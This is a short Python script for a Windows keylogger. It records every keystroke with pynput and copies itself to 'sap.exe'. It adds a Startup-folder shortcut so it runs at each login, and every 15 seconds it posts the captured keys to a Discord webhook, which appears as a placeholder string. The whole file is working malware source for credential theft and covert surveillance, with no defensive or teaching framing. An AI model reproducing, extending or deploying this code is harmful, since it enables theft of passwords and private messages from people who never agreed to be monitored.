import os
import time
import requests
import shutil
import sys
from pynput import keyboard
import winshell
import pythoncom
from win32com.client import Dispatch

discord = 'asdasdasdasadasootherpeoplecantgetmydiscrodwebhook'
file = "keylog.txt"

def send_to_discord(ss):
    q = {
        "tt": ss
    }
    requests.post(discord, json=q)

def on_press(key):
    try:
        with open(file, "a") as lol:
            lol.write(f"{key.char}\n")
    except AttributeError:
        with open(file, "a") as lol:
            lol.write(f"{key}\n")

is_copied_executable = os.path.basename(sys.argv[0]) == "sap.exe"

if not is_copied_executable:
    current_file = sys.argv[0]
    copy_file = os.path.join(os.path.dirname(current_file), "sap.exe")

    shutil.copyfile(current_file, copy_file)
    print(f"Copied to {copy_file}")

    startup_folder = winshell.startup()
    shortcut_path = os.path.join(startup_folder, "Sap.lnk")

    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortCut(shortcut_path)
    shortcut.Targetpath = copy_file
    shortcut.WorkingDirectory = os.path.dirname(copy_file)
    shortcut.save()
    
with keyboard.Listener(on_press=on_press) as listener:

    while True:
        time.sleep(15)

        if os.path.exists(file):
            with open(file, 'r') as f:
                ee = f.read()
            send_to_discord(ee)

            with open(file, "w") as lol:
                lol.write("")

listener.join()
